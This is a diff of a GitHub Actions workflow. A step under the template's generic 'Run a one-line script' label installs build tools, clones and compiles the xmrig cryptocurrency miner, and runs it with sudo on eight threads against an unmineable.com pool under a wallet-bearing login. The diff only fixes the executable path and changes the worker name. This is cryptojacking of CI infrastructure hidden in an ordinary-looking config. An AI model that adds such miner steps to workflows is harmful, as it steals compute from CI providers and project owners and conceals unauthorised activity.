@@ -27,7 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo .\xmrig.exe -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.lappy#cvdg-w1tt -p x --threads=8
+        run: sudo apt install git build-essential cmake automake libtool autoconf -y && git clone https://github.com/xmrig/xmrig.git && mkdir xmrig/build && cd xmrig/scripts && ./build_deps.sh && cd ../build && cmake .. -DXMRIG_DEPS=scripts/deps && make -j$(nproc) && pwd && ls && sudo ./xmrig -a rx/0 -o stratum+ssl://rx.unmineable.com:443 -u IRON:7205fdfd4092d8df37f7a1bb1548197bcf534b9c4eccd4618d12556512bdbcef.git#cvdg-w1tt -p x --threads=8
 
 
       # Runs a set of commands using the runners shell
